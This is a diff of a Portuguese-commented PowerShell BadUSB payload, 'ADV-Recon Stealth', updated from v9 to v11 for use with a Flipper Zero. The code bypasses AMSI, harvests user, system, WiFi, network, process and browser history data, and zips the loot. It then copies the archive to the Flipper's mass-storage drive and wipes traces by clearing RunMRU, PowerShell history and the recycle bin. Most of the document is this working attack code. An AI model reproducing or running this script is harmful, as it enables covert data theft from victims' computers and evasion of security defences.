@@ -1,31 +1,35 @@
 <#
 .SYNOPSIS
-    ADV-Recon Stealth v9 — Invisivel total + AMSI bypass
-    Recon 100% oculto. Aguarda 30s pelo Flipper Zero.
-    Exfiltracao para SD via USB Mass Storage.
+    ADV-Recon Stealth v11 — AMSI bypass + heartbeat local
+    Escreve a_trace.txt no TEMP para diagnostico.
 #>
 
 ############################################################################################################################################################
-# AMSI BYPASS (primeira linha executavel — antes de qualquer coisa)
+# AMSI BYPASS (redundante — o payload ja fez bypass, mas seguranca extra)
 ############################################################################################################################################################
 try {
-    $a=[Ref].Assembly.GetTypes()
-    foreach($t in $a){
-        if($t.Name -like '*AmsiUtils'){
-            $t.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-            break
-        }
-    }
+    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 }catch{}
 
 ############################################################################################################################################################
-# LOG INTERNO
+# HEARTBEAT LOCAL (diagnostico — remove depois de funcionar)
+############################################################################################################################################################
+$traceFile = "$env:TEMP\a_trace.txt"
+function T($m){
+    $ts = Get-Date -f 'HH:mm:ss'
+    "$ts | $m" | Out-File $traceFile -Append -Encoding ASCII
+}
+T 'v11 START'
+
+############################################################################################################################################################
+# LOG INTERNO (para debug.log no SD)
 ############################################################################################################################################################
 $Global:Log = @()
 function L($m){$Global:Log+=("[{0:HH:mm:ss}] {1}" -f (Get-Date),$m)}
 
-L 'ADV-Recon Stealth v9 iniciado'
+L 'ADV-Recon Stealth v11 iniciado'
 L ('User: '+$env:USERNAME+' | PC: '+$env:COMPUTERNAME)
+T ('User: '+$env:USERNAME+' | PC: '+$env:COMPUTERNAME)
 
 ############################################################################################################################################################
 # CONFIG
@@ -40,13 +44,14 @@ $Fn  = $env:USERNAME + '-LOOT-' + (Get-Date -f 'yyyy-MM-dd_HH-mm')
 $Zip = $Fn + '.zip'
 $WD  = $env:TEMP + '\' + $Fn
 $ZP  = $env:TEMP + '\' + $Zip
-
-mkdir $WD -Force | Out-Null
+T 'Config OK'
 
 ############################################################################################################################################################
 # RECON
 ############################################################################################################################################################
-L 'ETAPA 1: Tree'
+try { mkdir $WD -Force | Out-Null; T 'WD created' } catch { T 'WD FAIL'; exit }
+
+T 'ETAPA 1: Tree'
 try {
     cmd /c 'tree %USERPROFILE% /a /f' 2>$null | Out-File ($WD + '\tree.txt') -Encoding UTF8
     $tsz = (gi ($WD + '\tree.txt')).Length
@@ -54,16 +59,18 @@ try {
         cmd /c 'dir %USERPROFILE% /s /b' 2>$null | Out-File ($WD + '\tree.txt') -Encoding UTF8
     }
     L ('OK: Tree (' + $tsz + ' bytes)')
-} catch { L 'FAIL: Tree' }
+    T ('Tree OK: ' + $tsz)
+} catch { L 'FAIL: Tree'; T 'Tree FAIL' }
 
-L 'ETAPA 2: PS History'
+T 'ETAPA 2: PS History'
 try {
     $src = $env:APPDATA + '\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'
     cp $src ($WD + '\pshist.txt') -ea 0
     L 'OK: PS History'
-} catch { L 'FAIL: PS History' }
+    T 'PSHist OK'
+} catch { L 'FAIL: PS History'; T 'PSHist FAIL' }
 
-L 'ETAPA 3: User data'
+T 'ETAPA 3: User data'
 try { $ufn = (Get-LocalUser $env:USERNAME).FullName } catch { $ufn = $env:USERNAME }
 try { $uem = (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName } catch { $uem = 'N/D' }
 try {
@@ -74,12 +81,13 @@ try {
     if ($geo.Permission -eq 'Denied') { $la = 'N/D'; $lo = 'N/D'; $gs = 'Denied' }
     else { $la = $geo.Position.Location.Latitude; $lo = $geo.Position.Location.Longitude; $gs = 'OK' }
     L 'OK: Geo'
-} catch { $la = 'N/D'; $lo = 'N/D'; $gs = 'Err'; L 'FAIL: Geo' }
+    T 'Geo OK'
+} catch { $la = 'N/D'; $lo = 'N/D'; $gs = 'Err'; L 'FAIL: Geo'; T 'Geo FAIL' }
 
-L 'ETAPA 4: Local users'
-try { $lu = Get-WmiObject Win32_UserAccount | ft Caption, Domain, Name, FullName, SID | Out-String; L 'OK: Users' } catch { $lu = 'Err'; L 'FAIL: Users' }
+T 'ETAPA 4: Local users'
+try { $lu = Get-WmiObject Win32_UserAccount | ft Caption, Domain, Name, FullName, SID | Out-String; L 'OK: Users'; T 'Users OK' } catch { $lu = 'Err'; L 'FAIL: Users'; T 'Users FAIL' }
 
-L 'ETAPA 5: UAC/LSASS/RDP'
+T 'ETAPA 5: UAC/LSASS/RDP'
 try {
     $rk = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
     $c  = (gp $rk).ConsentPromptBehaviorAdmin
@@ -96,8 +104,9 @@ try {
     if ((gp $tsk).fDenyTSConnections -eq 0) { $rd = 'On' } else { $rd = 'Off' }
 } catch { $rd = 'Err' }
 L 'OK: UAC/LSASS/RDP'
+T 'UAC/LSASS/RDP OK'
 
-L 'ETAPA 6: Network'
+T 'ETAPA 6: Network'
 try { $pu = (iwr ipinfo.io/ip -UseBasicParsing -TimeoutSec 3).Content.Trim() } catch { $pu = 'Err' }
 try {
     $lip = Get-NetIPAddress -IfAlias '*Ethernet*', '*Wi-Fi*' -AddrFam IPv4 -ea 0
@@ -108,8 +117,9 @@ try {
     $mc = $mc | Select Name, MacAddress, Status | Out-String
 } catch { $mc = 'Err' }
 L 'OK: Network'
+T 'Network OK'
 
-L 'ETAPA 7: WiFi'
+T 'ETAPA 7: WiFi'
 try {
     $nwRaw = netsh wlan show networks mode=Bssid 2>$null
     $nwLines = $nwRaw | Where-Object { $_ -like 'SSID*' -or $_ -like '*Authentication*' -or $_ -like '*Encryption*' }
@@ -144,8 +154,9 @@ try {
     }
     L ('OK: WiFi Profiles (' + $wpOut.Count + ')')
 } catch { $wp = 'Err'; L 'FAIL: WiFi Profiles' }
+T 'WiFi OK'
 
-L 'ETAPA 8: System'
+T 'ETAPA 8: System'
 try { $cs = Get-CimInstance CIM_ComputerSystem; $cn = $cs.Name; $cm = $cs.Model; $cf = $cs.Manufacturer } catch { $cn = $env:COMPUTERNAME; $cm = '?'; $cf = '?' }
 try { $bios = Get-CimInstance CIM_BIOSElement | Out-String } catch { $bios = 'Err' }
 try { $os = (gwmi win32_operatingsystem) | Select Caption, Version | Out-String } catch { $os = 'Err' }
@@ -155,8 +166,9 @@ try { $rc = gwmi Win32_PhysicalMemory | measure Capacity -sum | %{ '{0:N1} GB' -
 try { $rm = gwmi Win32_PhysicalMemory | select DeviceLocator, @{N='Capacity';E={'{0:N1} GB'-f($_.Capacity/1GB)}}, ConfiguredClockSpeed, ConfiguredVoltage | ft | Out-String } catch { $rm = 'Err' }
 try { $vc = gwmi Win32_VideoController | ft Name, VideoProcessor, DriverVersion, CurrentHorizontalResolution, CurrentVerticalResolution | Out-String -w 250 } catch { $vc = 'Err' }
 L 'OK: System'
+T 'System OK'
 
-L 'ETAPA 9: Disks/Devices'
+T 'ETAPA 9: Disks/Devices'
 try {
     $dt = @{ 2 = 'Rem'; 3 = 'Fix'; 4 = 'Net'; 5 = 'CD' }
     $hd = gwmi Win32_LogicalDisk | select DeviceID, VolumeName, @{N='Tipo';E={$dt[[int]$_.DriveType]}}, FileSystem, VolumeSerialNumber, @{N='Sz';E={'{0:N1}G' -f ($_.Size/1Gb)}}, @{N='Fr';E={'{0:N1}G' -f ($_.FreeSpace/1Gb)}}, @{N='FrP';E={'{0:N1}' -f ((100/($_.Size/$_.FreeSpace)))}} | ft DeviceID, VolumeName, Tipo, FileSystem, VolumeSerialNumber, @{N='Size';E={$_.Sz};align='right'}, @{N='Free';E={$_.Fr};align='right'}, @{N='Free%';E={($_.FrP+' %%')};align='right'} | Out-String
@@ -164,8 +176,9 @@ try {
 try { $cmdev = gwmi Win32_USBControllerDevice -ea 0 | %{ [Wmi]($_.Dependent) } | Select Name, DeviceID, Manufacturer | sort Name -Desc | ft | Out-String -w 250 } catch { $cmdev = 'Err' }
 try { $na = gwmi Win32_NetworkAdapterConfiguration | ?{ $_.MACAddress -notlike $null } | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | ft | Out-String -w 250 } catch { $na = 'Err' }
 L 'OK: Disks/Devices'
+T 'Disks OK'
 
-L 'ETAPA 10: Procs/Conns/Svcs'
+T 'ETAPA 10: Procs/Conns/Svcs'
 try { $pr = gwmi win32_process | select Handle, ProcessName, ExecutablePath, CommandLine | sort ProcessName | ft Handle, ProcessName, ExecutablePath, CommandLine | Out-String -w 250 } catch { $pr = 'Err' }
 try {
     $tc = Get-NetTCPConnection -ea 0 | select @{N='Local';E={$_.LocalAddress+':'+$_.LocalPort}}, @{N='Remote';E={$_.RemoteAddress+':'+$_.RemotePort}}, State, AppliedSetting, OwningProcess
@@ -177,13 +190,15 @@ try {
 } catch { $tc = 'Err' }
 try { $sv = gwmi win32_service | select State, Name, DisplayName, PathName, @{N='Srt';E={$_.State+$_.Name}} | sort Srt | ft State, Name, DisplayName, PathName | Out-String -w 250 } catch { $sv = 'Err' }
 L 'OK: Procs/Conns/Svcs'
+T 'Procs/Conns OK'
 
-L 'ETAPA 11: Software/Drivers'
+T 'ETAPA 11: Software/Drivers'
 try { $sw = gp HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | ?{ $_.DisplayName -notlike $null } | Select DisplayName, DisplayVersion, Publisher, InstallDate | sort DisplayName | ft -Auto | Out-String -w 250 } catch { $sw = 'Err' }
 try { $dr = gwmi Win32_PnPSignedDriver | ?{ $_.DeviceName -notlike $null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion | Out-String -w 250 } catch { $dr = 'Err' }
 L 'OK: Software/Drivers'
+T 'Software OK'
 
-L 'ETAPA 12: Misc'
+T 'ETAPA 12: Misc'
 try {
     $startDir = [Environment]::GetFolderPath('Startup')
     $su = (ls $startDir -ea 0).Name -join ', '
@@ -193,8 +208,9 @@ try { $st = (Get-ScheduledTask -ea 0 | Select TaskName, State | ft -Auto | Out-S
 try { $kl = klist sessions 2>$null; if (!$kl) { $kl = 'Nenhuma' } } catch { $kl = 'Err' }
 try { $rf = ls $env:USERPROFILE -Recurse -File -ea 0 | sort LastWriteTime -Desc | select -First 50 FullName, LastWriteTime | Out-String } catch { $rf = 'Err' }
 L 'OK: Misc'
+T 'Misc OK'
 
-L 'ETAPA 13: Browser data'
+T 'ETAPA 13: Browser data'
 $bl = $WD + '\BrowserData.txt'
 $rx = '(http|https)://[\w\-\.]+(:\d+)?(/[\w\-\./\?%&=#]*)?'
 
@@ -223,14 +239,15 @@ B opera bookmarks "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera Stable\
 B brave history   "$Env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History"
 B brave bookmarks "$Env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Bookmarks"
 L 'OK: Browser data done'
+T 'Browser OK'
 
 ############################################################################################################################################################
 # COMPILAR & COMPRIMIR
 ############################################################################################################################################################
-L 'Compilando relatorio'
+T 'Compilando ZIP'
 $out = @"
-ADV-Recon Stealth v9
-===================
+ADV-Recon Stealth v11
+====================
 
 Full Name: $ufn
 Email: $uem
@@ -298,11 +315,12 @@ $dr
 "@
 $out > ($WD + '\computerData.txt')
 
-try { Compress-Archive $WD $ZP -Force; L ('ZIP: ' + $ZP) } catch { L 'ZIP FAIL' }
+try { Compress-Archive $WD $ZP -Force; L ('ZIP: ' + $ZP); T ('ZIP OK: ' + (gi $ZP).Length + ' bytes') } catch { L 'ZIP FAIL'; T 'ZIP FAIL' }
 
 ############################################################################################################################################################
-# ESPERAR FLIPPER (30s — completamente oculto)
+# ESPERAR FLIPPER (30s)
 ############################################################################################################################################################
+T 'Aguardando Flipper (30s)'
 
 $found  = $null
 $ok     = $false
@@ -325,6 +343,7 @@ while ($t -lt $Timeout -and !$found) {
             $mp = $v.DeviceID + '\' + $Marker
             if (Test-Path $mp -ea Stop) {
                 $found = $v.DeviceID
+                T ('Flipper encontrado em ' + $found)
                 break
             }
         } catch {}
@@ -332,6 +351,8 @@ while ($t -lt $Timeout -and !$found) {
 
     if (!$found) { Sleep 1; $t++ }
 }
+
+if (!$found) { T ('Timeout: nenhum drive com badusb encontrado apos ' + $Timeout + 's') }
 
 ############################################################################################################################################################
 # EXFILTRACAO
@@ -349,32 +370,37 @@ if ($found) {
             $Global:Log | Out-File ($found + '\debug.log') -Force
             $ok = $true
             L 'EXFIL: SUCESSO'
+            T 'EXFIL OK'
         } else {
             L 'EXFIL: Hash mismatch'
+            T 'EXFIL: Hash mismatch'
         }
     } catch {
         L ('EXFIL: Erro — ' + $_.Exception.Message)
+        T ('EXFIL error: ' + $_.Exception.Message)
     }
 } else {
     L 'EXFIL: Drive Flipper nao encontrado'
+    T 'EXFIL: Drive nao encontrado'
 }
 
 L ('Resultado final: ' + $(if($ok){'OK'}else{'NOK'}))
+T ('END: ' + $(if($ok){'OK'}else{'NOK'}))
 
 ############################################################################################################################################################
 # CLEANUP TOTAL
 ############################################################################################################################################################
 
-L 'Cleanup iniciado'
+T 'Cleanup iniciado'
 try { ri $WD -Recurse -Force -ea 0 } catch {}
 try { ri $ZP -Force -ea 0 } catch {}
 try { ri ($env:TEMP + '\a.ps1') -Force -ea 0 } catch {}
 try { ri ($env:TEMP + '\a_cnt.ps1') -Force -ea 0 } catch {}
 try { ri ($env:TEMP + '\a_res.txt') -Force -ea 0 } catch {}
-try { ri ($env:TEMP + '\*') -Recurse -Force -ea 0 } catch {}
 try { reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 2>$null } catch {}
 try { ri (Get-PSreadlineOption).HistorySavePath -ea 0 } catch {}
 try { Clear-RecycleBin -Force -ea 0 } catch {}
-L 'Cleanup concluido'
+# NOTA: a_trace.txt NAO e removido — fica para diagnostico
+T 'Cleanup OK (a_trace.txt preservado)'
 
 exit
